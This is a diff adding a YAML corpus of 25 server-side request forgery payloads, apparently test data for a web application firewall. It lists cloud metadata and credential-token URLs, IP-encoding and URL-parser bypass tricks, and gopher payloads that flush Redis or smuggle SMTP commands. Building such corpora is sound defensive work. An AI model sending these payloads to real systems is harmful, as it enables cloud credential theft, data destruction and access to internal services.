@@ -1,0 +1,178 @@
+# SSRF — 25 entries. Cloud metadata + localhost + scheme-confusion + bypass tricks.
+# WAF-view only. Sources: PayloadsAllTheThings/SSRF, HackTricks/SSRF-Cloud,
+# Orange Tsai's "URL parser confusion" research, jhaddix bypass list.
+
+- id: ssrf-aws-meta
+  class: ssrf
+  payload: "http://169.254.169.254/latest/meta-data/"
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-918
+  source: "PayloadsAllTheThings — AWS metadata"
+
+- id: ssrf-aws-iam
+  class: ssrf
+  payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Classic AWS role-credentials URL"
+
+- id: ssrf-aws-userdata
+  class: ssrf
+  payload: "http://169.254.169.254/latest/user-data"
+  trigger: *T200
+  cwe: CWE-918
+  source: "AWS user-data leak"
+
+- id: ssrf-imdsv2-token
+  class: ssrf
+  payload: "http://169.254.169.254/latest/api/token"
+  trigger: *T200
+  cwe: CWE-918
+  source: "AWS IMDSv2 token request (PUT-based but URL still recognisable)"
+
+- id: ssrf-gcp-meta
+  class: ssrf
+  payload: "http://metadata.google.internal/computeMetadata/v1/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "HackTricks — GCP metadata"
+
+- id: ssrf-gcp-token
+  class: ssrf
+  payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+  trigger: *T200
+  cwe: CWE-918
+  source: "GCP service-account token endpoint"
+
+- id: ssrf-azure-meta
+  class: ssrf
+  payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Azure IMDS endpoint"
+
+- id: ssrf-azure-identity
+  class: ssrf
+  payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Azure managed-identity token theft"
+
+- id: ssrf-do-meta
+  class: ssrf
+  payload: "http://169.254.169.254/metadata/v1.json"
+  trigger: *T200
+  cwe: CWE-918
+  source: "DigitalOcean droplet metadata"
+
+- id: ssrf-alibaba-meta
+  class: ssrf
+  payload: "http://100.100.100.200/latest/meta-data/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Alibaba Cloud ECS metadata"
+
+- id: ssrf-decimal-ip
+  class: ssrf
+  payload: "http://2852039166/"                          # 169.254.169.254 decimal
+  trigger: *T200
+  cwe: CWE-918
+  source: "jhaddix — decimal IP bypass"
+
+- id: ssrf-hex-ip
+  class: ssrf
+  payload: "http://0xa9fea9fe/latest/meta-data/"         # same IP in hex
+  trigger: *T200
+  cwe: CWE-918
+  source: "jhaddix — hex IP bypass"
+
+- id: ssrf-octal-ip
+  class: ssrf
+  payload: "http://0251.0376.0251.0376/"                 # 169.254.169.254 octal
+  trigger: *T200
+  cwe: CWE-918
+  source: "Orange Tsai — octal IP bypass"
+
+- id: ssrf-mixed-ip
+  class: ssrf
+  payload: "http://0xa9.254.0xa9.254/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Mixed hex/dotted-decimal IP"
+
+- id: ssrf-localhost-shorthand
+  class: ssrf
+  payload: "http://127.1/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Common WAF bypass — shorthand IP"
+
+- id: ssrf-localhost-zero
+  class: ssrf
+  payload: "http://0.0.0.0/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Unspecified-address bypass"
+
+- id: ssrf-ipv6-loopback
+  class: ssrf
+  payload: "http://[::]/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "IPv6 loopback shorthand"
+
+- id: ssrf-ipv6-mapped
+  class: ssrf
+  payload: "http://[::ffff:127.0.0.1]/admin"
+  trigger: *T200
+  cwe: CWE-918
+  source: "IPv4-mapped IPv6 — defeats v4-only deny lists"
+
+- id: ssrf-file-proto
+  class: ssrf
+  payload: "file:///etc/hostname"
+  trigger: *T200
+  cwe: CWE-918
+  source: "PayloadsAllTheThings — file:// scheme"
+
+- id: ssrf-gopher-redis
+  class: ssrf
+  payload: "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aQUIT"
+  trigger: *T200
+  cwe: CWE-918
+  source: "SSRF-to-Redis via gopher"
+
+- id: ssrf-gopher-smtp
+  class: ssrf
+  payload: "gopher://127.0.0.1:25/_HELO%20a%0AMAIL%20FROM:%3Ca@a%3E"
+  trigger: *T200
+  cwe: CWE-918
+  source: "SSRF-to-SMTP smuggling"
+
+- id: ssrf-dict
+  class: ssrf
+  payload: "dict://127.0.0.1:11211/stat"
+  trigger: *T200
+  cwe: CWE-918
+  source: "Memcached enum via dict://"
+
+- id: ssrf-ldap-proto
+  class: ssrf
+  payload: "ldap://127.0.0.1:389/%00"
+  trigger: *T200
+  cwe: CWE-918
+  source: "ldap:// SSRF probe"
+
+- id: ssrf-dnsrebind
+  class: ssrf
+  payload: "http://169.254.169.254.nip.io/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "nip.io DNS rebinding"
+
+- id: ssrf-userinfo-trick
+  class: ssrf
+  payload: "http://google.com@169.254.169.254/"
+  trigger: *T200
+  cwe: CWE-918
+  source: "URL userinfo confusion — looks like google.com to dumb parsers"
